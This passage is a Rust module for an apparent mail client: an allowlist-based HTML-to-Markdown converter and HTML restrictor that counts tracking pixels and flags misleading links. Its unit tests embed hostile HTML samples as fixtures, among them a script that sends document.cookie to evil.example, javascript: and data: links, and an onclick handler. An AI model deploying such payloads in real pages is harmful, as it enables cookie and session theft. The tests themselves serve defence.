//! HTML to Markdown, cautiously.
//!
//! This is the only thing that ever happens to an HTML mail in this program: it is parsed into a
//! tree, and a Markdown document is written from the handful of elements that mean something in a
//! letter. Everything else is dropped — usually with its contents, sometimes without.
//!
//! That ordering is the whole security story, and it is worth being explicit about why it is not
//! merely "we sanitize". A sanitizer starts from the sender's document and subtracts what it knows
//! is dangerous, so anything it fails to recognise survives; this starts from nothing and adds the
//! dozen elements a letter needs, so anything it fails to recognise is already gone. There is no
//! `src` attribute anywhere in the output, no stylesheet, no script, no frame, and no engine to
//! have a bug in. An image becomes the word "image" and its alt text. A tracking pixel becomes
//! nothing at all, and is counted on the way past so the reader can be told how many there were.
//!
//! What it costs is layout fidelity, which mail spends on making advertisements look like
//! advertisements. See `docs/mail-plan.md` §1.

use std::collections::BTreeMap;

/// The result of converting one HTML document.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Converted {
    pub markdown: String,
    /// Every `src` an `<img>` asked for, in document order, deduplicated. Nothing fetches these;
    /// they are here so the reader can be told what the sender wanted loaded.
    pub images: Vec<String>,
    /// Images with no alt text that are at most a few pixels on a side — a read receipt wearing a
    /// picture's clothes.
    pub trackers: usize,
    /// Links whose words name one destination and whose `href` is another.
    pub misleading: Vec<Misleading>,
}

/// A link that reads as one place and goes to another — the oldest trick in mail, and one the
/// client can catch on its own without trusting anybody.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Misleading {
    /// The words the reader sees.
    pub shown: String,
    /// Where it actually goes.
    pub actual: String,
}

/// Elements dropped along with everything inside them. Two kinds: things that execute or fetch
/// (`script`, `style`, `iframe`, `object`), and things that are document furniture rather than
/// content (`head`, `title`, `select`).
const DROPPED: &[&str] = &[
    "applet", "audio", "base", "basefont", "button", "canvas", "embed", "frame", "frameset", "head", "iframe", "input",
    "link", "map", "math", "meta", "noframes", "noscript", "object", "option", "param", "script", "select", "style",
    "svg", "template", "textarea", "title", "track", "video", "xml",
];

/// Elements that never have children, so a missing close tag is not a missing close tag.
const VOID: &[&str] =
    &["area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "param", "source", "track", "wbr"];

/// Schemes a link may keep. Everything else — `javascript:`, `data:`, `file:`, and whatever is
/// invented next — loses the link and keeps the words.
const SCHEMES: &[&str] = &["http://", "https://", "mailto:", "ftp://", "ftps://", "tel:", "news:", "nntp://"];

/// Converts one HTML document.
pub fn to_markdown(html: &str) -> Converted {
    let nodes = parse(html);
    let mut writer = Writer::default();
    writer.block(&nodes);
    writer.finish()
}

/// The document again as HTML, built from the same allowlist [`to_markdown`] reads from — for
/// handing to a layout engine that will draw it as sent.
///
/// The same order of operations as the Markdown path, and for the same reason: this starts from
/// nothing and adds what is allowed, so what it does not recognise is already gone. Every
/// element the parser drops stays dropped (`script`, `iframe`, `object`, forms). Of what is
/// left, an element keeps only the attributes on the allowlist: no `src`, no `on*`, no
/// `background`, and an `href` only with a scheme a link may keep. Stylesheets survive, because
/// they are what "original formatting" means, with every `url(...)`, `@import` and
/// `expression(...)` taken out of them — the engine underneath never fetches anything either,
/// which makes this the belt to its braces. A NUL byte, which the engine's C string cannot hold,
/// does not survive at all.
pub fn restrict(html: &str) -> String {
    let nodes = parse_with(&html.replace('\0', ""), true);
    let mut out = String::with_capacity(html.len());
    for node in &nodes {
        write_html(node, &mut out);
    }
    out
}

// ── The tree ────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
enum Node {
    Text(String),
    Element { name: String, attributes: BTreeMap<String, String>, children: Vec<Node> },
}

impl Node {
    fn attribute(&self, name: &str) -> Option<&str> {
        match self {
            Node::Element { attributes, .. } => attributes.get(name).map(String::as_str),
            Node::Text(_) => None,
        }
    }
}

/// Elements an opening tag implicitly closes. Mail HTML is written by machines that have never
/// read a specification, and `<p>` without `</p>` is the rule rather than the exception.
fn implied_close(opening: &str, open: &str) -> bool {
    match opening {
        "li" => open == "li",
        "p" => matches!(open, "p"),
        "tr" => matches!(open, "tr" | "td" | "th"),
        "td" | "th" => matches!(open, "td" | "th"),
        "dt" | "dd" => matches!(open, "dt" | "dd"),
        _ => false,
    }
}

fn parse(html: &str) -> Vec<Node> {
    parse_with(html, false)
}

/// `keep_style` keeps `<style>` elements, their text as their one child, for [`restrict`]; the
/// Markdown path has no use for a stylesheet and drops them with everything else that executes
/// or fetches.
fn parse_with(html: &str, keep_style: bool) -> Vec<Node> {
    let mut roots: Vec<Node> = Vec::new();
    // Each level is the element being filled and the children it has so far.
    let mut stack: Vec<(String, BTreeMap<String, String>, Vec<Node>)> = Vec::new();
    let bytes = html.as_bytes();
    let mut at = 0;

    let push =
        |stack: &mut Vec<(String, BTreeMap<String, String>, Vec<Node>)>, roots: &mut Vec<Node>, node: Node| match stack
            .last_mut()
        {
            Some((_, _, children)) => children.push(node),
            None => roots.push(node),
        };
    // Closes the innermost `name`, or does nothing if it was never opened.
    let close = |stack: &mut Vec<(String, BTreeMap<String, String>, Vec<Node>)>, roots: &mut Vec<Node>, name: &str| {
        let Some(depth) = stack.iter().rposition(|(open, _, _)| open == name) else {
            return;
        };
        while stack.len() > depth {
            let (name, attributes, children) = stack.pop().expect("depth is inside the stack");
            push(stack, roots, Node::Element { name, attributes, children });
        }
    };

    while at < bytes.len() {
        let Some(open) = html[at..].find('<').map(|offset| at + offset) else {
            let text = decode(&html[at..]);
            if !text.is_empty() {
                push(&mut stack, &mut roots, Node::Text(text));
            }
            break;
        };
        if open > at {
            let text = decode(&html[at..open]);
            if !text.is_empty() {
                push(&mut stack, &mut roots, Node::Text(text));
            }
        }

        // A comment, a doctype or a CDATA section: skip to its end, or to the end of the document
        // if it never has one.
        if html[open..].starts_with("<!--") {
            at = html[open + 4..].find("-->").map_or(bytes.len(), |offset| open + 4 + offset + 3);
            continue;
        }
        if html[open..].starts_with("<!") || html[open..].starts_with("<?") {
            at = html[open..].find('>').map_or(bytes.len(), |offset| open + offset + 1);
            continue;
        }

        // `a < b` is arithmetic, not markup: a tag starts with a name or a slash.
        let starts_a_tag =
            html[open + 1..].chars().next().is_some_and(|first| first.is_ascii_alphabetic() || first == '/');
        if !starts_a_tag {
            push(&mut stack, &mut roots, Node::Text("<".to_string()));
            at = open + 1;
            continue;
        }
        let Some(end) = tag_end(html, open) else {
            // A tag that never closes is the end of the document, which is what a browser does too.
            break;
        };
        let inside = &html[open + 1..end];
        at = end + 1;

        if let Some(name) = inside.strip_prefix('/') {
            let name = name.trim().to_ascii_lowercase();
            close(&mut stack, &mut roots, &name);
            continue;
        }

        let (name, attributes, self_closing) = tag(inside);
        if name.is_empty() {
            continue;
        }
        if DROPPED.contains(&name.as_str()) {
            // The contents go with it. Raw text elements (`script`, `style`) are skipped by
            // scanning for the close tag, because their bodies are not markup and may contain `<`.
            let after = skip_to_close(html, at, &name);
            if keep_style && name == "style" {
                let close = html[at..after].to_ascii_lowercase().rfind("</style").map_or(after, |offset| at + offset);
                let sheet = Node::Text(html[at..close].to_string());
                push(&mut stack, &mut roots, Node::Element { name, attributes, children: vec![sheet] });
            }
            at = after;
            continue;
        }
        while stack.last().is_some_and(|(open, _, _)| implied_close(&name, open)) {
            let open = stack.last().expect("just checked").0.clone();
            close(&mut stack, &mut roots, &open);
        }
        if self_closing || VOID.contains(&name.as_str()) {
            push(&mut stack, &mut roots, Node::Element { name, attributes, children: Vec::new() });
            continue;
        }
        stack.push((name, attributes, Vec::new()));
    }

    // Whatever is still open at the end of the document closes at the end of the document.
    while let Some((name, attributes, children)) = stack.pop() {
        push(&mut stack, &mut roots, Node::Element { name, attributes, children });
    }
    roots
}

/// The `>` that ends the tag opening at `open`, honouring quoted attribute values so that
/// `<a title="a > b">` is one tag.
fn tag_end(html: &str, open: usize) -> Option<usize> {
    let mut quote = None;
    for (offset, character) in html[open + 1..].char_indices() {
        match (quote, character) {
            (Some(mark), _) if character == mark => quote = None,
            (Some(_), _) => {}
            (None, '"' | '\'') => quote = Some(character),
            (None, '>') => return Some(open + 1 + offset),
            (None, _) => {}
        }
    }
    None
}

/// Where the document continues after an element whose contents are dropped.
fn skip_to_close(html: &str, from: usize, name: &str) -> usize {
    let needle = format!("</{name}");
    let lowered = html[from..].to_ascii_lowercase();
    match lowered.find(&needle) {
        Some(offset) => {
            let close = from + offset;
            html[close..].find('>').map_or(html.len(), |end| close + end + 1)
        }
        None => html.len(),
    }
}

/// Splits the inside of an opening tag into a name, its attributes, and whether it closed itself.
fn tag(inside: &str) -> (String, BTreeMap<String, String>, bool) {
    let inside = inside.trim();
    let self_closing = inside.ends_with('/');
    let inside = inside.trim_end_matches('/');
    let mut characters = inside.char_indices();
    let mut name_end = inside.len();
    for (offset, character) in characters.by_ref() {
        if character.is_whitespace() {
            name_end = offset;
            break;
        }
    }
    let name = inside[..name_end].to_ascii_lowercase();
    let mut attributes = BTreeMap::new();
    let mut rest = inside[name_end..].trim_start();
    while !rest.is_empty() {
        let key_end = rest.find(['=', ' ', '\t', '\n', '\r']).unwrap_or(rest.len());
        let key = rest[..key_end].to_ascii_lowercase();
        rest = rest[key_end..].trim_start();
        let mut value = String::new();
        if let Some(after) = rest.strip_prefix('=') {
            rest = after.trim_start();
            if let Some(after) = rest.strip_prefix(['"', '\'']) {
                let mark = rest.as_bytes()[0] as char;
                let end = after.find(mark).unwrap_or(after.len());
                value = decode(&after[..end]);
                rest = after.get(end + 1..).unwrap_or("");
            } else {
                let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
                value = decode(&rest[..end]);
                rest = &rest[end..];
            }
        }
        if !key.is_empty() {
            attributes.insert(key, value);
        }
        rest = rest.trim_start();
    }
    (name, attributes, self_closing)
}

// ── Writing HTML back ───────────────────────────────────────────────────────

/// Attributes any surviving element may keep. Presentation and structure, nothing that names a
/// resource or a handler.
const KEPT_ATTRIBUTES: &[&str] = &[
    "align",
    "alt",
    "bgcolor",
    "border",
    "cellpadding",
    "cellspacing",
    "class",
    "color",
    "colspan",
    "dir",
    "face",
    "height",
    "id",
    "lang",
    "role",
    "rowspan",
    "size",
    "start",
    "style",
    "title",
    "type",
    "valign",
    "width",
];

fn write_html(node: &Node, out: &mut String) {
    let (name, attributes, children) = match node {
        Node::Text(text) => {
            escape_html(text, out);
            return;
        }
        Node::Element { name, attributes, children } => (name.as_str(), attributes, children),
    };
    if DROPPED.contains(&name) && name != "style" {
        return;
    }
    out.push('<');
    out.push_str(name);
    for (key, value) in attributes {
        let value = match key.as_str() {
            "style" => scrub_css(value),
            "href" if name == "a" => {
                let href = value.trim();
                if !SCHEMES.iter().any(|scheme| href.to_ascii_lowercase().starts_with(scheme)) {
                    continue;
                }
                href.to_string()
            }
            key if KEPT_ATTRIBUTES.contains(&key) => value.clone(),
            _ => continue,
        };
        out.push(' ');
        out.push_str(key);
        out.push_str("=\"");
        escape_attribute(&value, out);
        out.push('"');
    }
    out.push('>');
    if VOID.contains(&name) {
        return;
    }
    if name == "style" {
        // A stylesheet's text is CSS, not markup; entity-escaping it would break every selector.
        for child in children {
            if let Node::Text(css) = child {
                out.push_str(&scrub_css(css));
            }
        }
    } else {
        for child in children {
            write_html(child, out);
        }
    }
    out.push_str("</");
    out.push_str(name);
    out.push('>');
}

fn escape_html(text: &str, out: &mut String) {
    for character in text.chars() {
        match character {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            other => out.push(other),
        }
    }
}

fn escape_attribute(text: &str, out: &mut String) {
    for character in text.chars() {
        match character {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            other => out.push(other),
        }
    }
}

/// CSS with everything that could name a resource taken out: `url(...)` becomes `none`, an
/// `@import` goes up to its semicolon, and `expression(...)` — script in a property, from an
/// Internet Explorer nobody should still meet — goes along with its argument.
fn scrub_css(css: &str) -> String {
    let lowered = css.to_ascii_lowercase();
    let mut out = String::with_capacity(css.len());
    let mut at = 0;
    while at < css.len() {
        let rest = &lowered[at..];
        if rest.starts_with("@import") {
            at += rest.find(';').map_or(rest.len(), |end| end + 1);
            continue;
        }
        if rest.starts_with("url(") || rest.starts_with("expression(") {
            // Through the parenthesis that balances the one just matched: `expression(f(x))`
            // has one inside it.
            let open = rest.find('(').expect("just matched a parenthesis");
            let mut depth = 0usize;
            let mut close = rest.len();
            for (offset, character) in rest[open..].char_indices() {
                match character {
                    '(' => depth += 1,
                    ')' => {
                        depth -= 1;
                        if depth == 0 {
                            close = open + offset + 1;
                            break;
                        }
                    }
                    _ => {}
                }
            }
            if rest.starts_with("url(") {
                out.push_str("none");
            }
            at += close;
            continue;
        }
        let character = css[at..].chars().next().expect("inside the string");
        out.push(character);
        at += character.len_utf8();
    }
    out
}

// ── Entities ────────────────────────────────────────────────────────────────

/// The named entities that actually turn up in mail. Everything else keeps its `&name;` spelling,
/// which is at least honest about not having been understood.
const ENTITIES: &[(&str, char)] = &[
    ("amp", '&'),
    ("lt", '<'),
    ("gt", '>'),
    ("quot", '"'),
    ("apos", '\''),
    ("nbsp", '\u{a0}'),
    ("copy", '©'),
    ("reg", '®'),
    ("trade", '™'),
    ("hellip", '…'),
    ("mdash", '—'),
    ("ndash", '–'),
    ("lsquo", '‘'),
    ("rsquo", '’'),
    ("ldquo", '“'),
    ("rdquo", '”'),
    ("bull", '•'),
    ("middot", '·'),
    ("laquo", '«'),
    ("raquo", '»'),
    ("deg", '°'),
    ("euro", '€'),
    ("pound", '£'),
    ("yen", '¥'),
    ("cent", '¢'),
    ("sect", '§'),
    ("para", '¶'),
    ("dagger", '†'),
    ("permil", '‰'),
    ("times", '×'),
    ("divide", '÷'),
    ("plusmn", '±'),
    ("frac12", '½'),
    ("shy", '\u{ad}'),
    ("zwnj", '\u{200c}'),
    ("zwj", '\u{200d}'),
    ("ensp", ' '),
    ("emsp", ' '),
    ("thinsp", ' '),
];

fn decode(text: &str) -> String {
    if !text.contains('&') {
        return text.to_string();
    }
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(start) = rest.find('&') {
        out.push_str(&rest[..start]);
        let after = &rest[start + 1..];
        // An entity is short; a stray `&` in prose is not the start of one.
        let end = after.find(';').filter(|end| *end <= 32);
        let Some(end) = end else {
            out.push('&');
            rest = after;
            continue;
        };
        let name = &after[..end];
        let resolved = if let Some(digits) = name.strip_prefix("#x").or_else(|| name.strip_prefix("#X")) {
            u32::from_str_radix(digits, 16).ok().and_then(char::from_u32)
        } else if let Some(digits) = name.strip_prefix('#') {
            digits.parse::<u32>().ok().and_then(char::from_u32)
        } else {
            ENTITIES.iter().find(|(entity, _)| *entity == name).map(|(_, character)| *character)
        };
        match resolved {
            Some(character) => out.push(character),
            None => {
                out.push('&');
                out.push_str(name);
                out.push(';');
            }
        }
        rest = &after[end + 1..];
    }
    out.push_str(rest);
    out
}

// ── Writing Markdown ────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq)]
enum Listing {
    Bullet,
    Number(u64),
}

#[derive(Default)]
struct Writer {
    out: String,
    quote: usize,
    lists: Vec<Listing>,
    /// A marker owed to the line about to be written: a list bullet or number.
    marker: Option<String>,
    /// Whether a blank line is owed before the next content, which is what separates two blocks.
    gap: bool,
    /// Whether anything has been written on the current line. A fresh [`Writer`] is at the start
    /// of a line that does not exist yet, which is why this is the way round it is: `Default` has
    /// to mean "nothing written", and it does.
    dirty: bool,
    images: Vec<String>,
    trackers: usize,
    misleading: Vec<Misleading>,
}

impl Writer {
    fn finish(mut self) -> Converted {
        while self.out.ends_with('\n') || self.out.ends_with(' ') {
            self.out.pop();
        }
        Converted { markdown: self.out, images: self.images, trackers: self.trackers, misleading: self.misleading }
    }

    /// Ends the current line, if there is one.
    fn newline(&mut self) {
        if self.dirty {
            self.out.push('\n');
            self.dirty = false;
        }
    }

    /// Ends the current block. The blank line is owed rather than written, so a block at the very
    /// end of the document does not leave one behind.
    fn break_block(&mut self) {
        self.newline();
        self.gap = true;
    }

    /// Opens a line: the blank line owed to the last block, then the quote marks and list indent
    /// this line sits inside, then any marker.
    fn open_line(&mut self) {
        if self.dirty {
            return;
        }
        if self.gap && !self.out.is_empty() {
            self.out.push_str(self.prefix().trim_end());
            self.out.push('\n');
        }
        self.gap = false;
        self.out.push_str(&self.prefix());
        if let Some(marker) = self.marker.take() {
            // The marker stands where this level's indent would have been, so the text of the item
            // lines up under its own bullet and a nested list indents past it.
            if self.out.ends_with("  ") {
                self.out.truncate(self.out.len() - 2);
            }
            self.out.push_str(&marker);
        }
        self.dirty = true;
    }

    fn prefix(&self) -> String {
        let mut prefix = "> ".repeat(self.quote);
        prefix.push_str(&"  ".repeat(self.lists.len()));
        prefix
    }

    fn word(&mut self, text: &str) {
        if text.is_empty() {
            return;
        }
        self.open_line();
        self.out.push_str(text);
    }

    /// Text from the document, with anything Markdown would read as formatting escaped. The sender
    /// already said what they meant in HTML; a literal asterisk must survive as one.
    fn text(&mut self, text: &str) {
        let mut collapsed = String::with_capacity(text.len());
        let mut space = false;
        for character in text.chars() {
            // A non-breaking space is content, not layout, and never collapses.
            if character.is_whitespace() && character != '\u{a0}' {
                space = true;
                continue;
            }
            if space {
                // A space at the start of a line is indentation, which Markdown reads as code.
                if !collapsed.is_empty() || self.dirty {
                    collapsed.push(' ');
                }
                space = false;
            }
            if matches!(character, '\\' | '`' | '*' | '_' | '[' | ']' | '<' | '>' | '|' | '~') {
                collapsed.push('\\');
            }
            collapsed.push(character);
        }
        if space && !collapsed.is_empty() {
            collapsed.push(' ');
        }
        if collapsed.is_empty() || collapsed == " " && !self.dirty {
            return;
        }
        self.word(&collapsed);
    }

    /// A run of nodes as blocks.
    fn block(&mut self, nodes: &[Node]) {
        for node in nodes {
            self.node(node);
        }
    }

    fn node(&mut self, node: &Node) {
        let (name, children) = match node {
            Node::Text(text) => {
                self.text(text);
                return;
            }
            Node::Element { name, children, .. } => (name.as_str(), children.as_slice()),
        };

        match name {
            "br" => {
                // A hard break inside a paragraph, which in Markdown is a trailing backslash.
                if self.dirty {
                    self.out.push('\\');
                }
                self.newline();
            }
            "hr" => {
                self.break_block();
                self.word("---");
                self.break_block();
            }
            "img" => self.image(node),
            "p" | "div" | "section" | "article" | "header" | "footer" | "main" | "aside" | "figure" | "figcaption"
            | "address" | "center" | "form" | "fieldset" | "dl" => {
                self.break_block();
                self.block(children);
                self.break_block();
            }
            "h1" | "h2" | "h3" | "h4" | "h5" | "h6" => {
                let level = name[1..].parse::<usize>().unwrap_or(1);
                self.break_block();
                self.word(&format!("{} ", "#".repeat(level)));
                self.block(children);
                self.break_block();
            }
            "blockquote" => {
                self.break_block();
                self.quote += 1;
                self.block(children);
                self.quote -= 1;
                self.break_block();
            }
            "pre" => self.pre(children),
            "ul" | "menu" => self.list(children, Listing::Bullet),
            "ol" => {
                let start = node.attribute("start").and_then(|value| value.parse().ok()).unwrap_or(1);
                self.list(children, Listing::Number(start));
            }
            "li" => {
                // A stray `<li>` outside any list still reads as one.
                let marker = match self.lists.last_mut() {
                    Some(Listing::Number(next)) => {
                        let marker = format!("{next}. ");
                        *next += 1;
                        marker
                    }
                    _ => "- ".to_string(),
                };
                self.newline();
                self.marker = Some(marker);
                self.block(children);
                self.newline();
            }
            "dt" => {
                self.break_block();
                self.word("**");
                self.block(children);
                self.word("**");
                self.break_block();
            }
            "dd" => {
                self.break_block();
                self.word("  ");
                self.block(children);
                self.break_block();
            }
            "table" => self.table(children),
            "a" => self.link(node, children),
            "strong" | "b" => self.wrapped("**", children),
            "em" | "i" | "cite" | "var" | "dfn" => self.wrapped("*", children),
            "del" | "s" | "strike" => self.wrapped("~~", children),
            "code" | "kbd" | "samp" | "tt" => self.code(children),
            // Everything else is transparent: `span`, `font`, `small`, `u`, `label`, and the
            // hundred wrappers a newsletter builder emits. Their text is the content.
            _ => self.block(children),
        }
    }

    /// A list. A nested one is part of the item above it rather than a block of its own, so it
    /// gets a line break and not a blank line — a blank line would make Markdown read the whole
    /// list as loose and space every item out.
    fn list(&mut self, children: &[Node], kind: Listing) {
        let nested = !self.lists.is_empty();
        if nested {
            self.newline();
        } else {
            self.break_block();
        }
        self.lists.push(kind);
        self.block(children);
        self.lists.pop();
        if nested {
            self.newline();
        } else {
            self.break_block();
        }
    }

    fn wrapped(&mut self, mark: &str, children: &[Node]) {
        let before = self.out.len();
        self.word(mark);
        let inner = self.out.len();
        self.block(children);
        // Emphasis around nothing is two asterisks in the reader's face.
        if self.out.len() == inner {
            self.out.truncate(before);
            return;
        }
        self.word(mark);
    }

    fn code(&mut self, children: &[Node]) {
        let before = self.out.len();
        self.word("`");
        let inner = self.out.len();
        self.plain(children);
        if self.out.len() == inner {
            self.out.truncate(before);
            return;
        }
        self.word("`");
    }

    /// Text with no Markdown escaping, for the inside of code — where nothing is formatting.
    fn plain(&mut self, nodes: &[Node]) {
        for node in nodes {
            match node {
                Node::Text(text) => {
                    let collapsed: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
                    // A backtick inside inline code cannot be escaped; a space keeps the run valid.
                    self.word(&collapsed.replace('`', "'"));
                }
                Node::Element { children, .. } => self.plain(children),
            }
        }
    }

    fn pre(&mut self, children: &[Node]) {
        self.break_block();
        self.word("```");
        self.newline();
        let mut text = String::new();
        gather(children, &mut text);
        for line in text.trim_matches('\n').lines() {
            self.word(line.trim_end());
            self.newline();
        }
        self.word("```");
        self.break_block();
    }

    fn image(&mut self, node: &Node) {
        let source = node.attribute("src").unwrap_or_default();
        let alt = node.attribute("alt").unwrap_or_default().trim();
        let tiny = |name: &str| {
            node.attribute(name)
                .and_then(|value| value.trim_end_matches("px").parse::<u32>().ok())
                .is_some_and(|size| size <= 3)
        };
        if !source.is_empty() && !self.images.iter().any(|seen| seen == source) {
            self.images.push(source.to_string());
        }
        // A pixel with nothing to say is a read receipt. It leaves no mark on the page; the count
        // goes to the reader as a number instead.
        if alt.is_empty() && (tiny("width") || tiny("height")) {
            self.trackers += 1;
            return;
        }
        if alt.is_empty() {
            self.trackers += usize::from(source.is_empty());
            return;
        }
        // Not `![alt](src)`: there is no URL in the output at all, so nothing downstream can be
        // tempted to resolve one.
        self.word("*[image: ");
        self.text(alt);
        self.word("]*");
    }

    fn link(&mut self, node: &Node, children: &[Node]) {
        let href = node.attribute("href").unwrap_or_default().trim();
        let safe = SCHEMES.iter().any(|scheme| href.to_ascii_lowercase().starts_with(scheme));
        if !safe {
            // An unsafe or relative href is not a link. The words stay; the destination does not.
            self.block(children);
            return;
        }
        let mut label = String::new();
        gather(children, &mut label);
        let label = label.split_whitespace().collect::<Vec<_>>().join(" ");

        // A link whose words are themselves an address is making a claim about where it goes, and
        // that claim can be checked here and nowhere else.
        if let Some(claimed) = named_host(&label) {
            let actual = host_of(href);
            if !actual.is_empty() && !same_site(&claimed, &actual) {
                let misleading = Misleading { shown: label.clone(), actual: href.to_string() };
                if !self.misleading.contains(&misleading) {
                    self.misleading.push(misleading);
                }
            }
        }

        let target = href.replace(' ', "%20").replace(')', "%29");
        if label.is_empty() || label == href {
            self.word(&format!("<{target}>"));
            return;
        }
        self.word("[");
        self.text(&label);
        self.word(&format!("]({target})"));
    }

    /// A table, which in mail is usually not a table.
    ///
    /// Newsletter builders lay pages out in nested `<table>`s, and rendering those as Markdown
    /// tables produces a grid of one-cell rows holding a whole email. So a table becomes a real
    /// table only when it says it is one, by having a header cell; otherwise its cells are just
    /// blocks, in order, which is what a layout table was always pretending to be.
    fn table(&mut self, children: &[Node]) {
        let rows = rows(children);
        let header = rows.first().filter(|row| row.iter().any(|(head, _)| *head));
        let columns = rows.iter().map(|row| row.len()).max().unwrap_or(0);
        if header.is_none() || columns < 2 {
            self.break_block();
            for row in &rows {
                for (_, cell) in row {
                    self.break_block();
                    self.block(cell);
                }
            }
            self.break_block();
            return;
        }

        self.break_block();
        let cells = |row: &Vec<(bool, Vec<Node>)>| -> String {
            (0..columns)
                .map(|column| {
                    let mut text = String::new();
                    if let Some((_, cell)) = row.get(column) {
                        gather(cell, &mut text);
                    }
                    text.split_whitespace().collect::<Vec<_>>().join(" ").replace('|', "\\|")
                })
                .collect::<Vec<_>>()
                .join(" | ")
        };
        for (index, row) in rows.iter().enumerate() {
            self.word(&format!("| {} |", cells(row)));
            self.newline();
            if index == 0 {
                self.word(&format!("| {} |", vec!["---"; columns].join(" | ")));
                self.newline();
            }
        }
        self.break_block();
    }
}

/// The cells of a table, row by row, each marked with whether it is a header cell. `thead`,
/// `tbody` and `tfoot` are transparent.
fn rows(children: &[Node]) -> Vec<Vec<(bool, Vec<Node>)>> {
    let mut rows = Vec::new();
    for node in children {
        let Node::Element { name, children, .. } = node else { continue };
        match name.as_str() {
            "thead" | "tbody" | "tfoot" => rows.extend(self::rows(children)),
            "tr" => {
                let cells: Vec<(bool, Vec<Node>)> = children
                    .iter()
                    .filter_map(|cell| match cell {
                        Node::Element { name, children, .. } if name == "td" || name == "th" => {
                            Some((name == "th", children.clone()))
                        }
                        _ => None,
                    })
                    .collect();
                if !cells.is_empty() {
                    rows.push(cells);
                }
            }
            _ => {}
        }
    }
    rows
}

/// The host a piece of link text is claiming to be, if it is claiming to be one at all.
///
/// "Click here" claims nothing. `bank.example` and `https://bank.example/login` both do, and a
/// reader who has been taught to check the link before clicking is checking exactly this.
fn named_host(label: &str) -> Option<String> {
    let label = label.trim().trim_end_matches(['.', ',', '!', '?']);
    if label.is_empty() || label.contains(char::is_whitespace) || label.contains('@') {
        return None;
    }
    let host = host_of(label);
    // A host, not a sentence with a full stop in it. "Read.this" is prose; `.this` is not a
    // top-level domain. Erring towards silence is deliberate: a badge that cries wolf over
    // ordinary writing is a badge nobody reads.
    let labels: Vec<&str> = host.split('.').collect();
    let plausible = labels.len() >= 2
        && labels.iter().all(|part| !part.is_empty())
        && labels.last().is_some_and(|top| {
            top.chars().all(|character| character.is_ascii_alphabetic())
                && (top.len() == 2 || top_level().contains(top))
        });
    plausible.then_some(host)
}

/// Top-level domains a link's words might plausibly name: every two-letter country code, the
/// reserved names from RFC 2606, and the generic ones mail actually turns up with. Not a public
/// suffix list — this decides whether a *label* is claiming to be a host at all, not who owns it.
fn top_level() -> &'static [&'static str] {
    &[
        "com",
        "net",
        "org",
        "edu",
        "gov",
        "mil",
        "int",
        "info",
        "biz",
        "name",
        "pro",
        "aero",
        "coop",
        "museum",
        "app",
        "dev",
        "page",
        "cloud",
        "site",
        "online",
        "shop",
        "store",
        "blog",
        "wiki",
        "email",
        "link",
        "click",
        "live",
        "life",
        "world",
        "today",
        "news",
        "media",
        "digital",
        "agency",
        "group",
        "team",
        "systems",
        "tech",
        "software",
        "network",
        "solutions",
        "services",
        "support",
        "security",
        "finance",
        "bank",
        "insurance",
        "xyz",
        "top",
        "icu",
        "vip",
        "fun",
        "space",
        "website",
        "host",
        "press",
        "social",
        "chat",
        "video",
        "example",
        "test",
        "invalid",
        "localhost",
    ]
}

/// The host part of a URL, lowercased, with scheme, credentials, port and path taken off.
fn host_of(url: &str) -> String {
    let rest = url.split_once("//").map_or(url, |(_, rest)| rest);
    let rest = rest.split_once(':').filter(|(scheme, _)| !scheme.contains('.')).map_or(rest, |(_, rest)| rest);
    let rest = rest.split(['/', '?', '#']).next().unwrap_or("");
    let rest = rest.rsplit_once('@').map_or(rest, |(_, host)| host);
    rest.split(':').next().unwrap_or("").trim_end_matches('.').to_ascii_lowercase()
}

/// Whether two hosts belong to the same place, by their last two labels.
fn same_site(left: &str, right: &str) -> bool {
    let tail = |host: &str| host.split('.').rev().take(2).collect::<Vec<_>>().join(".");
    tail(left) == tail(right)
}

/// All the text under these nodes, with nothing else.
fn gather(nodes: &[Node], into: &mut String) {
    for node in nodes {
        match node {
            Node::Text(text) => into.push_str(text),
            Node::Element { name, children, .. } => {
                if name == "br" {
                    into.push(' ');
                }
                gather(children, into);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn md(html: &str) -> String {
        to_markdown(html).markdown
    }

    #[test]
    fn a_letter_survives_as_a_letter() {
        let html = "<html><body><h1>Hello</h1><p>How <b>are</b> you?</p>\
            <ul><li>one</li><li>two</li></ul></body></html>";
        assert_eq!(md(html), "# Hello\n\nHow **are** you?\n\n- one\n- two");
    }

    /// The point of the module: nothing that executes or fetches reaches the output, and nothing
    /// that survives can be made to.
    #[test]
    fn nothing_that_executes_or_fetches_reaches_the_output() {
        let hostile = r#"
            <script>fetch('https://evil.example/?c='+document.cookie)</script>
            <style>body { background: url(https://evil.example/pixel) }</style>
            <iframe src="https://evil.example/frame"></iframe>
            <img src="https://evil.example/beacon.gif" width="1" height="1">
            <a href="javascript:alert(1)">click me</a>
            <a href="data:text/html;base64,PHNjcmlwdD4=">or me</a>
            <p onclick="steal()">safe words</p>
        "#;
        let converted = to_markdown(hostile);
        for forbidden in ["evil.example", "script", "javascript", "data:", "onclick", "iframe", "url("] {
            assert!(!converted.markdown.contains(forbidden), "{forbidden} survived:\n{}", converted.markdown);
        }
        assert!(converted.markdown.contains("safe words"));
        assert!(converted.markdown.contains("click me"), "the words stay even when the link does not");
        assert_eq!(converted.trackers, 1, "the beacon is counted rather than drawn");
        assert_eq!(converted.images, ["https://evil.example/beacon.gif"], "reported, never fetched");
    }

    #[test]
    fn a_safe_link_keeps_its_destination_and_an_unsafe_one_keeps_only_its_words() {
        assert_eq!(md(r#"<a href="https://example.com">home</a>"#), "[home](https://example.com)");
        assert_eq!(md(r#"<a href="mailto:a@b.example">mail me</a>"#), "[mail me](mailto:a@b.example)");
        // A bare URL as its own label is an autolink rather than a doubled one.
        assert_eq!(md(r#"<a href="https://example.com">https://example.com</a>"#), "<https://example.com>");
        assert_eq!(md(r#"<a href="/relative">local</a>"#), "local");
